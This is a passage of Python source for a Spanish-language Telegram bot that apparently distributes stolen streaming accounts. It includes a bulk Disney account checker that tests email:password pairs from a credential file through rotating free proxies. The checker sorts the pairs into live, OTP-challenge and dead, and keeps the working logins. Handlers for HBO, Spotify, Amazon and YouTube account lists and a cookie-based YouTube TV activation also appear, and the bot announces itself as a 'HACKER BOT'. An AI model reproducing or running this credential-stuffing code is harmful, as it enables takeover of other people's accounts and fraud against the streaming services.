                    "🛡️ <b>STATUS:</b> SUCCESSFUL\n"
                    "🍿 <b>Disfruta de YouTube Premium en tu TV.</b>"
                )
                await status_msg.edit_text(success_msg + FOOTER, parse_mode='HTML')
                asyncio.create_task(post_hit(context, update.effective_user.username or "Agent", "YOUTUBE TV"))
                return
        except: continue
        
    await status_msg.edit_text("<code>[✖] FAILED: No se pudo activar con las cookies actuales.\n[!] Intenta con un código nuevo.</code>", parse_mode='HTML')

async def check_disney_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    status_msg = await update.effective_message.reply_html("<code>[+] INITIATING SMART DISNEY CHECKER...\n[+] SCRAPING FRESH PROXIES...</code>")
    
    # Scrapear proxies
    proxies = ProxyManager.get_free_proxies()
    if not proxies:
        await safe_edit(status_msg, "<code>[-] ERROR: No proxies found. Try again later.</code>")
        return
        
    await safe_edit(status_msg, f"<code>[+] PROXIES LOADED: {len(proxies)}\n[+] ANALYZING DISNEY DATABASE...</code>")
    
    if not os.path.exists(DISNEY_ACC_FILE):
        await safe_edit(status_msg, "<code>[-] ERROR: Disney Database not found.</code>")
        return
        
    with open(DISNEY_ACC_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [l.strip() for l in f if l.strip()]
    
    total = len(lines)
    lives = []
    challenges = []
    deads = 0
    
    for line in lines:
        try:
            creds_part = line.split('|')[0].strip()
            if ':' not in creds_part: continue
            email, password = creds_part.split(':', 1)
            
            verified = False
            for _ in range(2): # 2 intentos con proxies diferentes
                proxy = ProxyManager.get_random_proxy(proxies)
                status, msg = await dispatch_mission(disney.check_disney_account, email.strip(), password.strip(), proxy)
                
                if status == "LIVE":
                    lives.append(line)
                    verified = True
                    break
                elif status == "CHALLENGE":
                    challenges.append(line)
                    verified = True
                    break
                elif status == "DEAD":
                    deads += 1
                    verified = True
                    break
            
            # AGGRESSIVE: Si tras 2 intentos no es LIVE o CHALLENGE, se asume muerta o bloqueada y se quita.
            if not verified:
                deads += 1
        except:
            deads += 1
            
    # Guardar solo las vivas
    with open(DISNEY_ACC_FILE, 'w', encoding='utf-8') as f:
        for l in lives:
            f.write(l + "\n")
            
    # Guardar las que piden código en un archivo aparte
    if challenges:
        with open("disney_challenges.txt", 'a', encoding='utf-8') as f:
            for l in challenges:
                f.write(l + "\n")
                
    report = (
        "<code>\n"
        " ╔══════════════════════════════════╗\n"
        " ║  ░▒▓█ DISNEY SMART CHECKER █▓▒░  ║\n"
        " ╚══════════════════════════════════╝\n\n"
        f" [>] Total Analizadas: {total}\n"
        f" [✔] Vivas (Live): {len(lives)}\n"
        f" [⚠️] Challenge (OTP): {len(challenges)}\n"
        f" [❌] Muertas (Dead): {deads}\n\n"
        " [!] Database cleaned successfully.\n"
        "</code>"
    )
    res = await safe_edit(status_msg, report + FOOTER)
    if not res: await update.effective_message.reply_html(report + FOOTER)

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).concurrent_updates(True).read_timeout(120).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("perfil", perfil))
    app.add_handler(CommandHandler("mantenimiento", mantenimiento))
    app.add_handler(CommandHandler("ayuda", open_help_command))
    app.add_handler(CommandHandler("ref", ref_command))
    app.add_handler(CommandHandler("refe", ref_command))
    app.add_handler(CommandHandler("difusion", broadcast))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("tv", tv_wrapper))
    app.add_handler(CommandHandler("addacc_hbo", addacc_hbo))
    app.add_handler(CommandHandler("clean_spotify", clean_spotify))
    app.add_handler(CommandHandler("clean_amazon", clean_amazon))
    app.add_handler(CommandHandler("clean_youtube", clean_youtube))
    app.add_handler(CommandHandler("tvyoutube", tv_youtube))
    app.add_handler(CommandHandler("check_disney", check_disney_bulk))
    app.add_handler(MessageHandler(filters.Document.ALL, upload_handler))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    # app.add_handler(MessageHandler(filters.Document.ALL, nfx.file_upload))
    
    print(f"💀 HACKER BOT FIXED & READY - OWNER: {OWNER_HANDLE}")
    app.run_polling()

